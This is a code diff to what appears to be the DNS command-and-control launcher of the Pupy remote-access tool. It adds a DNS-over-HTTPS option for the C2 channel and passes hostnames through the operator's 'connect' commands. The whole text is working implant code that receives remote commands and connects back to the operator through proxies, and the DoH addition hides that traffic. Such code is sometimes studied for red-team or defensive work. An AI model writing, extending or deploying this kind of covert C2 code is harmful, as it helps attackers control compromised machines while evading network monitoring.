@@ -33,10 +33,11 @@ logger = getLogger('dnscnc')
 
 
 class DNSCommandClientLauncher(DnsCommandsClient):
-    def __init__(self, domain, ns=None, qtype=None, ns_timeout=3):
+    def __init__(self, domain, doh=False, ns=None, qtype=None, ns_timeout=3):
         self.stream = None
         self.commands = []
         self.lock = Lock()
+        self.doh = doh
 
         try:
             import pupy_credentials
@@ -47,7 +48,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
             key = credentials['DNSCNC_PUB_KEY_V2']
 
         DnsCommandsClient.__init__(
-            self, domain, key, ns, qtype, ns_timeout=ns_timeout
+            self, domain, key, doh, ns, qtype, ns_timeout=ns_timeout
         )
 
     def on_session_established(self):
@@ -164,14 +165,18 @@ class DNSCommandClientLauncher(DnsCommandsClient):
         worker.daemon = True
         worker.start()
 
-    def on_connect(self, ip, port, transport, proxy):
-        logger.debug('connect request: %s:%s %s %s', ip, port, transport, proxy)
+    def on_connect(self, address, port, transport, proxy, hostname=None):
+        logger.debug(
+            'connect request: %s:%s %s %s%s',
+            address, port, transport, proxy, (' host=' + hostname) if hostname else ''
+        )
+
         with self.lock:
             if self.stream and not self.stream.closed:
                 logger.debug('ignoring connection request. stream = %s', self.stream)
                 return
 
-            self.commands.append(('connect', ip, port, transport, proxy))
+            self.commands.append(('connect', address, port, transport, proxy, hostname))
 
     def on_disconnect(self):
         logger.debug('disconnect request [stream=%s]', self.stream)
@@ -197,12 +202,14 @@ class DNSCncLauncher(BaseLauncher):
         super(DNSCncLauncher, self).__init__(*args, **kwargs)
         self.dnscnc = None
         self.exited = False
+        self.doh = False
 
     def parse_args(self, args):
         self.args = self.arg_parser.parse_args(args)
         self.set_host(self.args.domain)
         self.set_transport(None)
 
+        self.doh = self.args.doh
         self.ns = self.args.ns
         self.ns_timeout = self.args.ns_timeout
         self.qtype = self.args.qtype
@@ -215,7 +222,7 @@ class DNSCncLauncher(BaseLauncher):
 
         self.pupy = __import__('pupy')
         self.dnscnc = DNSCommandClientLauncher(
-            self.host, self.ns, self.qtype, self.ns_timeout)
+            self.host, self.doh, self.ns, self.qtype, self.ns_timeout)
         self.dnscnc.daemon = True
         self.dnscnc.start()
 
@@ -235,6 +242,10 @@ class DNSCncLauncher(BaseLauncher):
 
         cls.arg_parser.add_argument(
             '--ns', help='DNS server (will use internal DNS library)'
+        )
+
+        cls.arg_parser.add_argument(
+            '--doh', help='Use DNS-over-HTTPS', default=False, action='store_true'
         )
 
         cls.arg_parser.add_argument(
@@ -308,8 +319,10 @@ class DNSCncLauncher(BaseLauncher):
         return connection
 
     def connect_to_host(self, host_info, transport, proxies):
-        logger.info('connecting to %s:%d using transport %s ...',
-            host_info.host, host_info.port, transport)
+        logger.info('connecting to %s:%d (hostname=%s) using transport %s ...',
+            host_info.host, host_info.port, host_info.hostname,
+            transport
+        )
 
         transport_info = create_client_transport_info_for_addr(
             transport, host_info
@@ -352,7 +365,7 @@ class DNSCncLauncher(BaseLauncher):
         stream = None
         transport = None
 
-        _, host, port, transport, connection_proxy = command
+        _, host, port, transport, connection_proxy, hostname = command
 
         if connection_proxy is None:
             logger.debug('Connection proxy: autodetect')
@@ -365,7 +378,8 @@ class DNSCncLauncher(BaseLauncher):
         else:
             logger.debug('Connection proxy: chain: %s', connection_proxy)
 
-        host_info = HostInfo(host, port)
+        host_info = HostInfo(host, port, hostname)
+
         streams_iterator = self.connect_to_host(
             host_info, transport, connection_proxy)
 
